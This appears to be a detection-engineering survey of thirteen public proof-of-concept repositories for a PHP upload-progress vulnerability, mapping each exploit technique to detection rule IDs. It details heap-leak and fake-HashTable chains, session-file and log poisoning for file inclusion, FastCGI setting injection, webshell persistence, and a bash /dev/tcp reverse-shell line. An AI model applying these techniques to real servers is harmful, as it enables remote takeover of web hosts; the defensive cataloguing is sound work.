# PHP2Shell exploit corpus: types, techniques, and matching rules

Extracted from the thirteen repositories listed at the bottom, read on
2026-10-27. Each row pairs a technique from the client's code with the rule
that reacts to it. Rule IDs refer to `php2shell_rules.xml`.

## Corpus by repository

### aancw/php2shell-scanner (Go, passive)

| Type | Technique |
|---|---|
| Fingerprint | Reads `X-Powered-By: PHP/x.y.z`; otherwise parses a `phpinfo()` page |
| Path enumeration | Probes `index.php`, `info.php`, `phpinfo.php`, `test.php`, `pi.php`, `i.php`, `php.php`, `status.php`, `phpversion.php`, `version.php` |
| Config triage | Parses `phpinfo` values for `session.upload_progress.enabled`, `session.save_path`, `memory_limit`, `display_errors`, and the serialize handler |
| Arming probe | 1 KB multipart POST: `PHPSESSID` field, `PHP_SESSION_UPLOAD_PROGRESS` field, `file1` part, no cookie; `Set-Cookie: PHPSESSID` in the answer means upload progress is on |
| Handler mismatch | Reads `Failed to decode session object` to flag two apps sharing one save path with different handlers |

Rules: 100750, 100751, 100740, 100741, 100754, 100762.

### JoasASantos/php2shell-exploit (five chains)

| Type | Technique |
|---|---|
| v1, code exec | Fake `HashTable` whose `pDestructor` is `zif_system`; one worker crash per command |
| v2 htaccess | `system()` writes `.htaccess` with `php_value auto_prepend_file "/tmp/.p2s_v2.php"`, then drops the webshell |
| v2 gadget | Writes `PG(auto_prepend_file)` in BSS through `lxb_css_selector_list_remove`; no `.htaccess` |
| v2 zero | Session-file carrier plus the BSS write; no file in the web root |
| v2 grooming | Keep-alive pipeline on one pinned worker; no crashes |
| OOM body | 860 parts, form names nested 64 levels with 90 bytes of padding, boundary `C` x 10 |
| Post-exploit | Webshell prints `<<<P2S>>>` around output; reverse shell via bash, python, perl, nc, or php |

Rules: 100762, 100744, 100760, 100757, 100758, 100710.

### aarsaputra/php2shell (Indonesian docs, detection and chain)

| Type | Technique |
|---|---|
| Detection | Version verdict per branch, `display_errors` probe, `upload_progress` probe via `Set-Cookie`, handler-mismatch probe |
| Chain | Worker rotate, heap leak, `libphp` leak, fake `HashTable`; fixed SID `attacksessionid0001`; `id>/out/p1` |
| Calibration | Reports RCE, leak-only, or no-result per PHP build and architecture |
| Post-exploit | Runbook for turning the primitive into an interactive shell |

Rules: 100750, 100740, 100741, 100752, 100753, 100757.

### eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC

| Type | Technique |
|---|---|
| Stage 0 | Abort the current prefork worker so the next child starts with a clean heap |
| Stage 1 | OOM with a 12 MB multipart field; uninitialized memory leaks through `Set-Cookie: PHPSESSID` (Zend MM chunk base) |
| Stage 2 | Serialization alignment leaks `ZVAL_PTR_DTOR`, giving the `libphp` base |
| Stage 3 | 167-byte `zend_string` carries a fake `HashTable` with `pDestructor` = `zif_system`; commands limited to 14 bytes, so longer ones chain through `sh</tmp/c` |
| Offsets | Profile presets, or `docker/offsets.py` against a local container |

Rules: 100710, 100712, 100752, 100758, 100731.

### ZeroHackOrg/php2shell-poc

| Type | Technique |
|---|---|
| Trigger | Multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` and a stalled file part (1.5 s) |
| Grooming | 50 rounds of nested multipart writes, progress value `g0` to `g49` |
| Client disguise | Boundary `----WebKitFormBoundary` plus 16 hex characters |
| Reverse shell | `bash -i >& /dev/tcp/<ip>/<port> 0>&1`, with `sh` fallback |
| Persistence | Drops `pwn.php`, a webshell gated on `auth_pass` with a `cmd` parameter |

Rules: 100740, 100757, 100758, 100756, 100761, 100731.

### dimasma0305/php2shell

| Type | Technique |
|---|---|
| Passive scan | HEAD/GET only; correlates version, runtime identity, fingerprints, cookies, and visible upload surfaces |
| Exploit client | Requires exact PHP 8.4.26 build, prefork `mod_php`, keep-alive, upload progress, and a ~140 MiB calibrated request |
| Targets | Six RCE-verified lab apps: WordPress, MediaWiki, DokuWiki, Joomla, plain PHP, CodeIgniter |
| Defense | Suricata SID 9000618 on boundary `S` x 17 plus `PHP_SESSION_UPLOAD_PROGRESS`; documents a benign upload that triggered it |

Rules: 100742, 100740, 100750.

### jf0x3f/php2shell-pocs

| Type | Technique |
|---|---|
| 109618 trigger | One multipart part with 80,000 headers forces memory exhaustion during parsing |
| 109619 trigger | PHP 8.5.4 with `fatal_error_backtraces=1`: a fatal-error producer followed by an `.htaccess` consumer leaves `zend_mm_heap corrupted` and a replaced worker |
| ASLR lab | Wraps the 9bie client against PHP 8.4.26 |

Rules: 100710, 100752, 100722, 100730.

### 9bie/php2shell-bypass-aslr-exp

| Type | Technique |
|---|---|
| Preconditions | `display_errors=Off`, `memory_limit=128M`, stock 150-worker prefork |
| Worker pinning | Holds 149 workers with unfinished requests so A1/B1/A2/B2 land on the same child |
| A1 | OOM at end-of-request cleanup with the `Set-Cookie` path still open |
| B1 | Stale-id out-of-bounds read; leaks chunk base and `zval_ptr_dtor`, then the `libphp` base |
| A2/B2 | Main chunk chosen from the leak, then the fake `HashTable` and `zif_system` |
| Transport | Chunked bodies and junk query pairs `q0000000` to `q0000004` |

Rules: 100752, 100753, 100758, 100710, 100770.

### adriyansyah-mf/php2shell-bookworm

| Type | Technique |
|---|---|
| Save-path probe | Tests 4-character paths with `. /tmp/sess_`, `/run/sess_`, `/var/sess_` bootstrap prefixes |
| SID probes | Single NUL byte, 19 `a` characters, 32 `a` characters in the `PHPSESSID` field |
| OOM ramp | Retries at 12, 24, 32, 48, 64, 96, 128, 160, 192, 256, 320, 384, 512 MB |
| Carrier | Same 167-byte string as the reference PoC, 14-byte command limit |

Rules: 100710, 100713, 100740, 100741, 100731.

### Ademking/php2shell-nuclei-templates (four templates)

| Type | Technique |
|---|---|
| Session fixation | `PHPSESSID` sent as a multipart field with an invalid id, plus `PHP_SESSION_UPLOAD_PROGRESS`; matches the PHP startup warnings |
| Version check | `X-Powered-By` compared against the fixed releases; no exploit traffic |
| Handler mismatch | Writes `x|O:8:"stdClass":0:{}` into the upload filename under `php_serialize`, reads the session back through a `php`-handler endpoint, matches the decode failure |
| Session injection to LFI | Filename holds `<?php echo marker; ?>`, then GET `lfi_path` + `/tmp/sessions/sess_<sid>`; needs `cleanup=Off` and `use_strict_mode=Off` |

Rules: 100741, 100743, 100754, 100740, 100713, 100714, 100750.

### ikow/php2shell-poc (five chains plus a detection pack)

| Type | Technique |
|---|---|
| Chain A | PHP code in the upload filename, then include `/tmp/sessions/sess_<sid>` through any LFI sink |
| Chain B | `var_destroy` UAF; finds `zif_system` through `EG()`, overwrites the `var_dump` handler via `/proc/self/mem`; needs an `unserialize()` sink, leaves no network signature |
| Chain C | Pollutes the FPM worker's `PS(serializer)`, injects a serialized object through the filename, `__destruct` runs when decoding fails |
| Chain D | OOM leaves stale `EG()` on mod_php; no application precondition |
| Chain E | FPM session OOM leaves stale `BG()`: producer is any `session_start()` endpoint, consumer is any endpoint that then answers 502 |
| Detection pack | 12 Suricata/Snort rules, Sigma, ModSecurity v2/v3, Lua; keys on chunked multipart, oversized filename, leaked cookie bytes, session path in URL |

Rules: 100741, 100743, 100767, 100754, 100710, 100712, 100752, 100771, 100772, 100773, 100774.

### syrex1013/php2shell (four delivery paths)

| Type | Technique |
|---|---|
| Session poison + LFI | PHP tag in the multipart filename, then include one of 14 probed `sess_<sid>` paths, Linux and Windows |
| Log poison | Payload in the User-Agent, then include `/var/log/{apache2,apache,nginx}/access.log` through the same LFI |
| FastCGI direct | Raw FastCGI to FPM with `PHP_ADMIN_VALUE: allow_url_include=On` and `auto_prepend_file=<sess file>`; no HTTP request, so no web log |
| PEAR webshell | `auto_prepend_file` pointed at `pearcmd.php`, then a command writes a webshell into the web root |
| Trigger modes | destroy, regenerate, gc, double, abort; stalls the upload past `session.upload_progress.min_freq` |

Rules: 100743, 100767, 100775, 100776, 100744, 100713, 100714.

### projectdiscovery/nuclei-templates (CVE-2026-109618)

| Type | Technique |
|---|---|
| Active crash probe | Three OOM bodies at 1 MB with 4000 parts, 8 MB and 20 MB with 1020 parts each; boundary left empty |
| Body shape | Field name is `a` followed by a 62-deep `[a]` chain and an empty `filename`; filler lines are `x:` |
| Verdict | Response must contain `Allowed memory size of`, `bytes exhausted`, and `Unknown`; otherwise a version verdict applies, suppressed for distro builds |

Rules: 100766, 100710, 100712, 100750.

## Consolidated types

| # | Exploit type | One-line technique | Rules |
|---|---|---|---|
| 1 | Fingerprinting | Version, `phpinfo`, and config disclosure | 100750, 100751 |
| 2 | Session fixation | `PHPSESSID` accepted from a multipart field instead of a cookie | 100741, 100713 |
| 3 | Session file injection | PHP code, a serialized object, or an inflated filename written into `sess_<id>` | 100743, 100714, 100773 |
| 4 | LFI to RCE | Include `sess_<id>` or a poisoned access log after injection | 100743, 100767, 100775, 100776 |
| 5 | Handler mismatch | `php_serialize` write, `php` read, destructor fires on decode failure | 100754 |
| 6 | OOM heap leak | Oversized, chunked or deeply nested multipart body, ASLR base leaked in a cookie | 100710, 100712, 100766, 100768, 100769, 100772, 100774 |
| 7 | Worker control | Abort, rotate, or pin prefork children; a dying FPM worker answers 502 | 100701, 100702, 100752, 100753, 100771 |
| 8 | Fake dispatch | Forged `HashTable` or BSS write reaches `zif_system` or `auto_prepend_file` | 100752, 100764 |
| 9 | Persistence | `.htaccess`, `.user.ini`, webshell in `/tmp` or the web root | 100730, 100755, 100731, 100756 |
| 10 | Post-exploit | Reverse shell, downloads, command output to a file | 100757, 100758, 100759 |

Counter and duplicate rules (100703, 100704, 100711, 100720, 100721, 100763,
100765) raise the level when a row above repeats: 503 instead of 500, a crash
campaign, an edge rejection, a 5xx follow-up to the probe.

## Sources disagree on the mechanism

eness and Ademking describe a
use-after-free in the upload-progress handler (CWE-416) plus a session
fixation variant (CWE-384). projectdiscovery describes `longjmp()` on OOM
leaving uninitialized request memory. JoasASantos states that session
poisoning is not the real mechanism. The rules target artifacts that all
accounts produce, so the disagreement does not change the detection, but read
the mechanism section of a source before writing an incident report.

## Repository list

- https://github.com/aancw/php2shell-scanner
- https://github.com/JoasASantos/php2shell-exploit
- https://github.com/aarsaputra/php2shell
- https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC
- https://github.com/ZeroHackOrg/php2shell-poc
- https://github.com/dimasma0305/php2shell
- https://github.com/jf0x3f/php2shell-pocs
- https://github.com/9bie/php2shell-bypass-aslr-exp
- https://github.com/adriyansyah-mf/php2shell-bookworm
- https://github.com/Ademking/php2shell-nuclei-templates
- https://github.com/ikow/php2shell-poc
- https://github.com/syrex1013/php2shell
- https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-109618.yaml
